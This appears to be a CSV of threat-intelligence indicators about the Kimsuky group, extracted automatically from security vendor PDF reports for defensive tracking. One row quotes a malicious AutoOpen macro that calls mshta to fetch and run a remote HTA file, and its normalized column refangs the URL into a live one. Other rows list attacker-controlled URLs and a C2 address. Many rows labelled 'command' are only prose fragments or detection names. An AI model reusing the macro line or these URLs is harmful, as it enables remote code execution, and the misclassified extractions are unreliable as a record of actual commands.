schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--kimsuky,artifact--sha256:166905db2a5a2065eb8d3d6cf93bb3f086469c17fcd5a8a6209ffe162957fa1d,observation--sha256:391cba8e589a795d1c04520dd7c720950c3c52ad94df87907444ad0572d25d4d,command,PowerShell process.,PowerShell process,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"12 Figure 11 - Stage 1 payload executes via scheduled task and opens RTF lure Figure 12 - Stage 2 payload downloads obfuscated gzip payload, extracts and loads in memory The second stage reflectively loads XeroRAT as a final payload. The script: 1. Defines GzExtract function to gunzip a byte array. 2. Downloads an obfuscated gzip payload from google drive. The payload has an RTF magic file header, likely as a way to bypass suspicious file type controls. 3. Replaces first 7 bytes with Gzip magic ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c545739720aa6233676ff25db9ee6665d3504abc9ad0694e48805ddfc6d02eb9,observation--sha256:e46f90fde5daa3c33256d2c3527d0ceb1e290e91f3cfbe840d443976b114682f,command,"PowerShell to extract to %temp% before execution. Similarly, a previous version","PowerShell to extract to %temp% before execution. Similarly, a previous version",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"9 Rapid7 also observed a recent version with an embedded payload that uses PowerShell to extract to %temp% before execution. Similarly, a previous version of Kimsuky LNK payloads uses the same embedded payload method of extraction with heavily obfuscated PowerShell substitution. Figure 7 - Heavily obfuscated embedded payload variant Rapid7 observed several techniques to bypass lazy signatures or tooling limitations: • Move towards in-memory execution to limit dropping malware binaries on disk • ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8216252a61bbe06c352ac453a83505fb4831266d0b928ecdd40ab48b9f7a7b19,observation--sha256:fca54b633a2ebe49dfe6c64be8ba7159b662ce68f906d554e7bea5614172afc2,command,"PowerShell, but are stripped with the cmd.exe stage of the process tree.","PowerShell, but are stripped with the cmd.exe stage of the process tree",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"9 Rapid7 also observed a recent version with an embedded payload that uses PowerShell to extract to %temp% before execution. Similarly, a previous version of Kimsuky LNK payloads uses the same embedded payload method of extraction with heavily obfuscated PowerShell substitution. Figure 7 - Heavily obfuscated embedded payload variant Rapid7 observed several techniques to bypass lazy signatures or tooling limitations: • Move towards in-memory execution to limit dropping malware binaries on disk • ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7ce7e309f2d02543aa006b3e53c49c253686f3f01e842462afc16f982d476721,observation--sha256:cd6037b5f3fb5fc0d3c1afd59b3b03ddea56ee8ee17bedd3431548a2de1c1672,command,"Shell (""mshta https://tdalpacafarm[.]com/files/kr/contents/Vkggy0.hta"")","Shell (""mshta https://tdalpacafarm.com/files/kr/contents/Vkggy0.hta",candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 7}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,".Forward = True .Wrap = wdFindContinue .MatchWholeWord = True End With Selection.Find.Execute Replace:=wdReplaceAll End Sub Sub AutoOpen() Shell (""mshta https://tdalpacafarm[.]com/files/kr/contents/Vkggy0.hta"") End Sub If the 'Vkggy0.hta' in the code above is loaded normally, it will receive an HTTP GET response by executing the internal VBScript command and the additional PowerShell commands would be subsequently executed. The recently found malicious document files also have the same sequence ",
1.0.0,actor--kimsuky,artifact--sha256:cc8389b0c39a114b23461d109e3c545c1ff713a20ff86ac6002abf89bc491bf2,observation--sha256:cabcb2568fa8be3629bd2bd5bb187034f493d3c5036b78c1eac13ab8e9b1d1c3,command,Target Process rundll32.exe,Target Process rundll32.exe,candidate,2023-07-14T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Detect attempts to svchost.exe N/A (Table 6) Behavior log of Ammy RAT installation process 17:12:05 Operation Covert Stalker Report Target Process rundll32.exe Creates executable file ntrol\SafeBoot\Network\ts 2023-07-14 cmd.exe svchost.exe N/A It is Fileless. Connects to network 188.42.129.148:80(LU) aa_nts.dll Behavior 2) BlackBit ransomware infection svchost.exe process Report Time 17:12:03 Target aa_nts.dll (Ammy RAT) kmanager N/A 2023-07-14 N/A (Figure 15) File structure of BlackBit ransomw,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:98eced2be906f31efb1294ed9a060216658471e37b77bba302483ce06f78cbce,observation--sha256:921c33a6395705b1cacedf30d0989981282bcb71541b5dc83e6517540d466df9,command,The PowerShell-based function ‘Start-KeyLogger’ installed by the HWP malicious document was also used,The PowerShell-based function ‘Start-KeyLogger’ installed by the HWP malicious document was also used,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 11}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"[Figure 5] Digital signature of EGIS Co., Ltd. HTA script used in the DOC attack vector indicates that the similar script format has been used in both the recently discovered APT attack 'Campaign Smoke Screen' and the HWP document-based attack 'Operation Stealth Power', which occurred on March 31 and April 1 in Korea. The PowerShell-based function ‘Start-KeyLogger’ installed by the HWP malicious document was also used the same as it is used in the DOC malicious document series. The threat organi",
1.0.0,actor--kimsuky,artifact--sha256:b988bdbb1ddeb4a74a70d46f98cbf9d734b1fd1e52ac7e164b8990da8ab5642f,observation--sha256:8f8b108892ec4b8ff255041f715bfea33dc65c16c615b61e0613a4ef0a52defb,command,"The behavior pattern (malicious code execution ÿ mshta.exe (C2 access) ÿ cmd.exe execution) is constant, and only the file name of the initially executed malware is used.","The behavior pattern (malicious code execution ÿ mshta.exe (C2 access) ÿ cmd.exe execution) is constant, and only the file name of the initially executed malware is used",candidate,2023-07-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 84}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Executes 10:17:22 Connect to N/A 10:29:25 2023-07-17 2023-07-18 Operation Covert Stalker Report File Less explorer.exe network 10:29:25 explorer.exe Process Executes 5911.pdf.exe N/A 2023-07-18 mshta.exe 2023-07-14 2023-07-14 process process network Creates This is an excerpt of some of the malicious actions performed by the Kimsuky organization on 14*.10*.23*.21*(US), which occurs through malware testing. mshta.exe 10:29:25 10:17:22 2023-07-18 [+] (ASEC Blog) “Distributing malware disguised as ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d847a3c0a3469c0858b76c15ae5611452ceab69b386daae8afedba6dfec97c8c,observation--sha256:38c5146e36842c6f26981a0b9edcbfbc53318d0372056d082498437e767e0c1d,command,"The malicious script code goes through stages 1-3 of the following steps, runs a PowerShell-","The malicious script code goes through stages 1-3 of the following steps, runs a PowerShell-",candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 3}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"Post0.Send: t0=Post0.responseText: Execute(t0) The malicious script code goes through stages 1-3 of the following steps, runs a PowerShell- based keylogger, and secretly collects information from the infected computer, then registers itself in the system registry to conduct espionage operations by communicating with its C2 server. - http://naban.co[.]kr/mobile/skin/member/ctml/v/first.hta - http://naban.co[.]kr/mobile/skin/member/ctml/v/expres.php?op=1 - http://naban.co[.]kr/mobile/skin/member/c",
1.0.0,actor--kimsuky,artifact--sha256:135c502fb6e57573eb8c332bf2b418a1236e35c69d1dd67c43b2046afbe4fcf4,observation--sha256:7826c473f482668ff68ca724e34e92a520dcf5e66a58e7219d52d736dedd9765,command,This is an excerpt from only a portion of the behavior log. It accesses different URLs at 8-second intervals and displays a malicious Powershell with the same file name.,This is an excerpt from only a portion of the behavior log. It accesses different URLs at 8-second intervals and displays a malicious Powershell with the same file name,candidate,2021-11-06T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 70}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"In the analysis work pattern of the analyst's sequential processing method, the act of downloading the script was explained as occurring. 2021-11-06 It is a collection of hacking tools and is used by consultants and corporate security teams for mock hacking and penetration testing. Kimsuky 211.168.252.55\users\%ASD%\downloads\mimikatz_trunk\ %SystemDrive%\metasploit- framework\embedded\framework\data\templates\templat 11:21:40 11:21:11 2021-11-06 Excluding the hacking targets, only analysts and ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:cda6ee9e28d3eb690a14e1f28d1fe3f95364f51ff017be371ac640cc260b82aa,observation--sha256:a7b64bce7c96c10852e6680fe2c3e9a2df3361ab385f3e78e2e66d6f4228779c,command,Trojan/PowerShell.Agent.SC186245 (2023.05.08.00),Trojan/PowerShell.Agent.SC186245 (2023.05.08.00,candidate,2023-05-26T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--b637a112eaeac062,kimsuky/monthreport/ATIP_2023_May_Threat-Trend-Report-on-Kimsuky-Group.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"May 2023 Threat Trend Report on Kimsuky Group 10 AhnLab Response Overview The detection names and the engine version information of AhnLab products are shown below. Even if the activities of this threat group have been identified recently, AhnLab products may have already detected the related malware in the past. While ASEC is tracking the activities of this group and responding to related m alware, there can be variants that have not been identified and thus are not detected. Backdoor/Win.Apple",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7a49da854ccf85c1fd3fff6290e34826c0001474570c313753f3ac355508c82e,observation--sha256:686abcbbd72d6c4728aec31b6b5ad8cdbfefdfa08c748ecc63d204f18a431b3d,command,Trojan/PowerShell.KeyLogger (2023.05.09.00),Trojan/PowerShell.KeyLogger (2023.05.09.00,candidate,2023-05-26T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--b637a112eaeac062,kimsuky/monthreport/ATIP_2023_May_Threat-Trend-Report-on-Kimsuky-Group.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"May 2023 Threat Trend Report on Kimsuky Group 10 AhnLab Response Overview The detection names and the engine version information of AhnLab products are shown below. Even if the activities of this threat group have been identified recently, AhnLab products may have already detected the related malware in the past. While ASEC is tracking the activities of this group and responding to related m alware, there can be variants that have not been identified and thus are not detected. Backdoor/Win.Apple",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:f7611d2ec2e682f3faee9b61a42a2f1753bf0db0623ab69d539130421e6fc3e1,observation--sha256:68092e91767b770989667ab0688f087e9b395e268ae12e77f999a5a0f3fcf0fa,command,Trojan/Powershell.FlowerPower.SC188960 (2023.05.26.00),Trojan/Powershell.FlowerPower.SC188960 (2023.05.26.00,candidate,2023-05-26T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--b637a112eaeac062,kimsuky/monthreport/ATIP_2023_May_Threat-Trend-Report-on-Kimsuky-Group.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"May 2023 Threat Trend Report on Kimsuky Group 10 AhnLab Response Overview The detection names and the engine version information of AhnLab products are shown below. Even if the activities of this threat group have been identified recently, AhnLab products may have already detected the related malware in the past. While ASEC is tracking the activities of this group and responding to related m alware, there can be variants that have not been identified and thus are not detected. Backdoor/Win.Apple",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:cc5541f4adfbd62008051dceff491c104af4dfc79e1625d207cd4474c601c5fc,observation--sha256:09b498cda06cf841183c583914775b5233de9c0ca15f8d6feecedf6bd4c83a21,command,Trojan/Powershell.FlowerPower.SC188966 (2023.05.26.00),Trojan/Powershell.FlowerPower.SC188966 (2023.05.26.00,candidate,2023-05-26T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--b637a112eaeac062,kimsuky/monthreport/ATIP_2023_May_Threat-Trend-Report-on-Kimsuky-Group.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"May 2023 Threat Trend Report on Kimsuky Group 10 AhnLab Response Overview The detection names and the engine version information of AhnLab products are shown below. Even if the activities of this threat group have been identified recently, AhnLab products may have already detected the related malware in the past. While ASEC is tracking the activities of this group and responding to related m alware, there can be variants that have not been identified and thus are not detected. Backdoor/Win.Apple",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:16f44e012a917b86c2a6297152ded5282111fc7b8ecdc960f07004f529df69ed,observation--sha256:f78e9be651b6e88fcf401d7b09a2eb17dbb9ae49b95b579da069db7d8f9d6cf2,command,Trojan/Powershell.FlowerPower.SC189040 (2023.06.02.00),Trojan/Powershell.FlowerPower.SC189040 (2023.06.02.00,candidate,2023-05-26T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--b637a112eaeac062,kimsuky/monthreport/ATIP_2023_May_Threat-Trend-Report-on-Kimsuky-Group.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"May 2023 Threat Trend Report on Kimsuky Group 10 AhnLab Response Overview The detection names and the engine version information of AhnLab products are shown below. Even if the activities of this threat group have been identified recently, AhnLab products may have already detected the related malware in the past. While ASEC is tracking the activities of this group and responding to related m alware, there can be variants that have not been identified and thus are not detected. Backdoor/Win.Apple",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:fe1f535bb2832aeac77aa8e340a206f5feb8587174a5f712edbdacbc84b2b514,observation--sha256:1a6430f8d12d40bdb1e5d1cada244dc60acc7c8276bc51f7b2be86ca936ef266,command,Trojan/Powershell.FlowerPower.SC189043 (2023.06.02.00),Trojan/Powershell.FlowerPower.SC189043 (2023.06.02.00,candidate,2023-05-26T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--b637a112eaeac062,kimsuky/monthreport/ATIP_2023_May_Threat-Trend-Report-on-Kimsuky-Group.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"May 2023 Threat Trend Report on Kimsuky Group 10 AhnLab Response Overview The detection names and the engine version information of AhnLab products are shown below. Even if the activities of this threat group have been identified recently, AhnLab products may have already detected the related malware in the past. While ASEC is tracking the activities of this group and responding to related m alware, there can be variants that have not been identified and thus are not detected. Backdoor/Win.Apple",Actor-directory corpus sweep; ambiguous values remain candidates.
